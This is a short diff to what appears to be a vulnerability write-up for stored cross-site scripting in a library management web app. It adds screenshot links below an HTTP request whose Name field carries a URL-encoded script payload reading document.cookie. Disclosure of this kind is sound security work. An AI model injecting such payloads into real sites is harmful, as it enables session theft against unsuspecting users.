@@ -39,3 +39,9 @@ Connection: close
 
 Name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&EmailId=admin%40gmail.com&MobNo=0&Password=admin&submit=
 ```
+
+![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/1.png)
+
+![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/2.png)
+
+![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/3.png)
